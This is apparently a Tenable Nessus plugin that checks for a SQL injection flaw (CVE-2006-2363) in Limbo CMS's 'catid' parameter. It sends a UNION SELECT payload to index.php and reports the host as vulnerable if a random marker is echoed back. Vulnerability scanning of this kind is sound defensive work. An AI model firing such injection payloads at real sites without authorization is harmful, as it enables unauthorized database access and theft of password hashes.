#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21558);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-2363");
  script_bugtraq_id(17870);
  script_xref(name:"OSVDB", value:"25682");

  script_name(english:"Limbo weblinks.html.php catid Parameter SQL Injection");
  script_summary(english:"Tries to affect DB queries in Limbo CMS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Limbo CMS, a content-management system
written in PHP. 

The version of Limbo CMS installed on the remote host fails to
sanitize input to the 'catid' parameter of the 'index.php' script
before using it in a database query.  An unauthenticated attacker may
be able to leverage this issue to manipulate SQL queries to uncover
password hashes for arbitrary users of the affected application. 

Note that successful exploitation requires that Limbo is configured to
use MySQL for its database backend, which is not the default." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/433221/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://forum.limbofreak.com/index.php?topic=6.0" );
 script_set_attribute(attribute:"solution", value:
"Apply Cumulative Patch v8 to Limbo 1.0.4.2." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/limbo", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  magic = rand_str(length:12, charset:"0123456789");
  exploit = string("-1 UNION SELECT 0,1,2,", magic, ",4,5,6,7,8,9,10,11--");
  req = http_get(
    item:string(
      dir, "/index.php?",
      "option=weblinks&",
      "Itemid=2&",
      "catid=", urlencode(str:exploit)
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # we see our magic string and...
    string('div class="componentheading" >', magic) >< res &&
    # it looks like Limbo
    egrep(pattern:"Site powered By <a [^>]+>Limbo CMS<", string:res)
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
